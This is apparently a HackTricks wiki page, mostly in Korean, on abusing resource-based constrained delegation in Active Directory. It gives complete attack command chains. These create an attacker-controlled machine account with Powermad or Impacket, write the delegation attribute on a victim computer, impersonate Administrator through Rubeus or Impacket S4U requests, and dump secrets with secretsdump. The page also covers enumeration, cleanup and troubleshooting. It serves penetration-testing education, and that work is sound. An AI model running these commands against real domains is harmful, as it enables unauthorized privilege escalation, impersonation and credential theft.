# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

이는 기본 [Constrained Delegation](constrained-delegation.md)과 유사하지만, **대신** 권한을 **object** 에게 부여하여 **impersonate any user against a machine** 하도록 하는 것이 아니라, Resource-based Constrain Delegation은 **해당 object에 대해 누가 어떤 사용자든 impersonate할 수 있는지**를 **object 안에 설정**합니다.

이 경우, 제약된 객체는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 라는 속성을 가지며, 그 속성에는 해당 객체에 대해 다른 어떤 사용자든 impersonate할 수 있는 사용자의 이름이 들어갑니다.

또 다른 중요한 차이점은, 기존의 Constrained Delegation과 달리 **machine account에 대한 write permissions** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)을 가진 누구나 **_msDS-AllowedToActOnBehalfOfOtherIdentity_** 를 설정할 수 있다는 점입니다 (다른 형태의 Delegation에서는 domain admin 권한이 필요했습니다).

### 새로운 개념

과거 Constrained Delegation에서는 사용자 계정의 _userAccountControl_ 값 안에 있는 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self** 를 수행하는 데 필요하다고 알려져 있었습니다. 하지만 그것이 완전한 진실은 아닙니다. 실제로는 해당 값이 없어도, 당신이 **service**(SPN을 보유한 경우)라면 어떤 사용자에 대해서도 **S4U2Self** 를 수행할 수 있습니다. 다만, **`TrustedToAuthForDelegation`** 를 **가지고 있다면** 반환된 TGS는 **Forwardable** 하고, 그 플래그를 **가지고 있지 않다면** 반환된 TGS는 **Forwardable 하지 않습니다**.

그러나 S4U2Proxy에서 사용되는 **TGS**가 **NOT Forwardable**이면 기본 Constrain Delegation을 악용하려 해도 **작동하지 않습니다**. 하지만 **Resource-Based constrain delegation**을 이용하는 경우에는 작동합니다.

### 공격 구조

> 만약 **Computer** 계정에 대해 **write equivalent privileges**를 가지고 있다면 해당 머신에서 **privileged access**를 획득할 수 있습니다.

공격자가 이미 **victim computer에 대한 write equivalent privileges**를 보유하고 있다고 가정합니다.

1. 공격자는 **SPN**을 가진 계정을 **compromise** 하거나 **생성(create)** 합니다(“Service A”). 주의할 점은 **any** _Admin User_는 다른 특별 권한 없이도 최대 10개의 Computer 객체(**_MachineAccountQuota_**)를 **create** 하고 그들에 SPN을 설정할 수 있다는 것입니다. 따라서 공격자는 단순히 Computer 객체를 생성하고 SPN을 설정할 수 있습니다.
2. 공격자는 victim computer (ServiceB)에 대한 **WRITE privilege**를 남용하여 ServiceA가 해당 victim computer(ServiceB)에 대해 **impersonate any user** 할 수 있도록 resource-based constrained delegation을 구성합니다.
3. 공격자는 Rubeus를 사용해 Service A에서 Service B로 **full S4U attack**(S4U2Self 및 S4U2Proxy)을 수행하여 Service B에 **privileged access**를 가진 사용자에 대해 공격을 실행합니다.
   1. S4U2Self (from the SPN compromised/created account): 자신에게 대한 **TGS of Administrator to me** 를 요청합니다 (Not Forwardable).
   2. S4U2Proxy: 이전 단계에서 얻은 **not Forwardable TGS**를 사용해 **Administrator**로부터 **victim host**로 가는 **TGS**를 요청합니다.
   3. not Forwardable TGS를 사용하더라도 Resource-based constrained delegation을 악용하고 있기 때문에 작동합니다.
   4. 공격자는 **pass-the-ticket** 를 통해 티켓을 전달하고 사용자를 **impersonate** 하여 **victim ServiceB에 대한 access**를 획득할 수 있습니다.

도메인의 _**MachineAccountQuota**_ 를 확인하려면 다음을 사용할 수 있습니다:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 객체 생성

도메인 내에 컴퓨터 객체를 생성하려면 **[powermad](https://github.com/Kevin-Robertson/Powermad):** 를 사용할 수 있습니다.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation 구성하기

**activedirectory PowerShell module 사용하기**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview 사용하기**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

우선, 비밀번호 `123456`으로 새 Computer 객체를 생성했으므로 해당 비밀번호의 해시가 필요합니다:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이 명령은 해당 계정의 RC4 및 AES 해시를 출력합니다.\
이제 공격을 수행할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus의 `/altservice` 파라미터를 사용하면 한 번의 요청으로 더 많은 서비스용 티켓을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 사용자는 "**Cannot be delegated**"라는 속성을 가지고 있다는 점에 유의하세요. 해당 사용자의 이 속성이 True이면, 그 사용자를 impersonate할 수 없습니다. 이 속성은 bloodhound에서 확인할 수 있습니다.

### Linux 환경: end-to-end RBCD with Impacket (2024+)

If you operate from Linux, you can perform the full RBCD chain using the official Impacket tools:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
노트
- LDAP signing/LDAPS가 강제되는 경우, `impacket-rbcd -use-ldaps ...`를 사용하세요.
- AES 키를 우선 사용하세요; 많은 최신 도메인에서는 RC4를 제한합니다. Impacket과 Rubeus는 둘 다 AES-only 흐름을 지원합니다.
- Impacket은 일부 툴에서 `sname` ("AnySPN")를 재작성할 수 있으나, 가능한 경우 올바른 SPN(예: CIFS/LDAP/HTTP/HOST/MSSQLSvc)을 확보하세요.

### 접근

마지막 명령줄은 **complete S4U attack and will inject the TGS**를 수행하여 Administrator로부터 피해자 호스트의 **메모리**에 TGS를 주입합니다.  
이 예에서는 Administrator로부터 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
```bash
ls \\victim.domain.local\C$
```
### 다양한 서비스 티켓 악용

여기에서 [**사용 가능한 서비스 티켓**](silver-ticket.md#available-services)을 확인하세요.

## 열거, 감사 및 정리

### RBCD가 구성된 컴퓨터 열거

PowerShell (SD를 디코딩하여 SID를 확인):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (한 번의 명령으로 읽기 또는 플러시):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 정리 / RBCD 초기화

- PowerShell (속성 지우기):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 Kerberos가 DES 또는 RC4를 사용하지 않도록 구성되어 있고 당신은 RC4 해시만 제공하고 있다는 의미입니다. Rubeus에 적어도 AES256 해시를 제공하거나 (또는 rc4, aes128, aes256 해시를 모두 제공) 하세요. 예: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: 이는 현재 컴퓨터의 시간이 DC의 시간과 달라 Kerberos가 제대로 작동하지 않는다는 의미입니다.
- **`preauth_failed`**: 이는 주어진 사용자명 + 해시로 로그인이 되지 않는다는 의미입니다. 해시를 생성할 때 사용자명 안에 "$"를 넣는 것을 잊었을 수 있습니다 (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: 이는 다음을 의미할 수 있습니다:
  - 당신이 가장해보려는 사용자가 원하는 서비스에 접근할 수 없습니다 (당신이 그것을 가장할 수 없거나 충분한 권한이 없기 때문)
  - 요청한 서비스가 존재하지 않습니다 (예: winrm 티켓을 요청했는데 winrm이 실행 중이지 않은 경우)
  - 생성된 fakecomputer가 취약한 서버에 대한 권한을 잃었고 권한을 돌려줘야 합니다.
  - 당신은 클래식 KCD를 악용하고 있습니다; 기억하세요 RBCD는 non-forwardable S4U2Self 티켓으로 동작하는 반면 KCD는 forwardable을 요구합니다.

## 참고사항, relays 및 대안

- LDAP가 필터링된 경우 AD Web Services (ADWS)를 통해 RBCD SD를 쓸 수도 있습니다. 자세한 내용은 다음을 참조하세요:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay 체인은 종종 RBCD로 끝나 한 단계로 local SYSTEM 권한을 얻습니다. 실용적인 종단 간 예시는 다음을 참조하세요:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding이 **비활성화**되어 있고 machine account를 생성할 수 있다면, **KrbRelayUp** 같은 도구는 강제된 Kerberos 인증을 LDAP로 relay하여 대상 컴퓨터 객체에 대해 당신의 machine account의 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정하고, 오프호스트에서 즉시 S4U를 통해 **Administrator**로 가장할 수 있습니다.

## 참고자료

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (공식): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 최근 문법을 정리한 빠른 Linux 치트시트: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
